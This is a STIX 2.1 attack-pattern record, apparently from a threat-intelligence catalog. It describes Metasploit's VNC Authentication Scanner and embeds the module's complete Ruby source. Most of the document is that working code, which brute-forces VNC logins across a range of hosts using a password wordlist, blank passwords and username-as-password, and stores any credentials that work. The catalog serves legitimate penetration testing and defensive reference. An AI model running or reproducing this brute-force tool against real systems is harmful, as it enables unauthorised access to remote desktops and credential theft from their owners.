{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98b07dc5-4612-43ae-a60c-6aac73d34527",
    "created": "2024-08-14T16:27:52.994537Z",
    "modified": "2024-08-14T16:27:52.994541Z",
    "name": "VNC Authentication Scanner",
    "description": " This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vnc/vnc_login.rb",
            "external_id": "vnc_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0506#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/vnc'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'VNC Authentication Scanner',\n      'Description' => %q{\n          This module will test a VNC server on a range of machines and\n        report successful logins. Currently it supports RFB protocol\n        version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response\n        authentication method.\n      },\n      'Author'      =>\n        [\n          'carstein <carstein.sec[at]gmail.com>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '1999-0506'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::Proxies,\n        Opt::RPORT(5900),\n        OptString.new('PASSWORD', [ false, 'The password to test' ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"vnc_passwords.txt\") ]),\n\n        # We need to set the following options to make sure BLANK_PASSWORDS functions properly\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),\n        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n\n    register_autofilter_ports((5900..5910).to_a) # Each instance increments the port by one.\n\n    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any\n    # usernames that are passed in.\n    @strip_usernames = true\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Starting VNC login sweep\")\n\n    cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::VNC.new(\n        host: ip,\n        port: rport,\n        proxies: datastore['PROXIES'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: datastore['ConnectTimeout'],\n        max_send_size: datastore['TCP::max_send_size'],\n        send_delay: datastore['TCP::send_delay'],\n        framework: framework,\n        framework_module: self,\n        ssl: datastore['SSL'],\n        ssl_version: datastore['SSLVersion'],\n        ssl_verify_mode: datastore['SSLVerifyMode'],\n        ssl_cipher: datastore['SSLCipher'],\n        local_port: datastore['CPORT'],\n        local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n\n  end\nend\n"
}